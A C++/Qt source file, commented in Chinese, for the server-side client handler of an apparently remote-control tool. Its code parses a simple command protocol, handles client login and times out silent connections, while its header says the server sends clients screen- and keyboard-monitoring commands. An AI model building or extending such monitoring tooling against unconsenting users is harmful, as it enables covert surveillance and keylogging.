//1.这个类组合了刚才的TcpSocket类，用来处理客户的信息：“登入，登出”等等，向客户发送指：“监控屏幕，监控键盘”等等。
//2.制定两组指令，一组是服务端向客户发送的指令，一组是客户端向服务端发送的指令。
//3.处理从客户端发送过来的数据；向客户端发送指令。
//4.如果新的客户登入后，就把它加入到ZeroServer里显示在widget类里的客户列表mClientTable里;登出则相反。
//5.本类也设置一个计时器，如果长时间未能收到登录的消息就会自动跟客户断开

#include "zeroclient.h"

//ZeroClient::ZeroClient(QObject *parent) : QObject(parent)
ZeroClient::ZeroClient(QTcpSocket *sock, QObject *parent) : QObject(parent), mId(-1)
{
    // 设置socket
    mSock = new TcpSocket(sock, this);
    connect(mSock, SIGNAL(newData()), this, SLOT(newData()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(disconnected()));

    // 设置计时器来判断客户是否登入，如果没就断开连接
    // 我在这里设置10秒钟，很随意的，你想怎么设置都可以
    mLoginTimeout = new QTimer(this);
    connect(mLoginTimeout, SIGNAL(timeout()), this, SLOT(clientLoginTimeout()));
    mLoginTimeout->start(10*1000);
}

void ZeroClient::closeAndDelete()
{
    // 输出信息
    qDebug() << mSock->socket()->peerAddress().toString() << ":"
             << mSock->socket()->peerPort() << " 已经断开服务端";

    mSock->close();
    deleteLater();
}

void ZeroClient::processCommand(QByteArray &cmd, QByteArray &args)
{
    cmd = cmd.toUpper().trimmed();
    QHash<QByteArray, QByteArray> hashArgs = parseArgs(args);

    // 登入指令
    if (cmd == CmdLogin && mId == -1) {
        doLogin(hashArgs);
        return;
    }
}

QHash<QByteArray, QByteArray> ZeroClient::parseArgs(QByteArray &args)
{
    QList<QByteArray> listArgs = args.split(CmdSplit[0]);

    // 分解参数，然后把它加入哈希表
    QHash<QByteArray, QByteArray> hashArgs;
    for(int i=0; i<listArgs.length()-1 ; i+=2) {
        hashArgs.insert(listArgs[i].toUpper().trimmed(),
                        listArgs[i+1].trimmed());
    }

    return hashArgs;
}

void ZeroClient::doLogin(QHash<QByteArray, QByteArray> &args)
{
    // 发射登录信号
    QString userName = args["USER_NAME"];
    QString system = args["SYSTEM"];
    QString ip = mSock->socket()->peerAddress().toString();
    int port = mSock->socket()->peerPort();
    emit login(this, userName, ip, port, system);

    // 输出信息
    qDebug() << ip << ":" << port << " 已经登入服务端";
}

void ZeroClient::clientLoginTimeout()
{
    if (mId == -1) {
        closeAndDelete();
    }
}

void ZeroClient::disconnected()
{
    if (mId >= 0) {
        emit logout(mId);
    }

    closeAndDelete();
}

void ZeroClient::newData()
{
    // 从socket里获取缓存区
    QByteArray *buf = mSock->buffer();

    int endIndex;
    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
        // 提取一行指令
        QByteArray data = buf->mid(0, endIndex);
        buf->remove(0, endIndex + CmdEnd.length());

        // 提取指令和参数
        QByteArray cmd, args;
        int argIndex = data.indexOf(CmdSplit);
        if (argIndex == -1) {
            cmd = data;
        } else {
            cmd = data.mid(0, argIndex);
            args = data.mid(argIndex+CmdSplit.length(), data.length());
        }

        // 处理指令
        processCommand(cmd, args);
    }
}
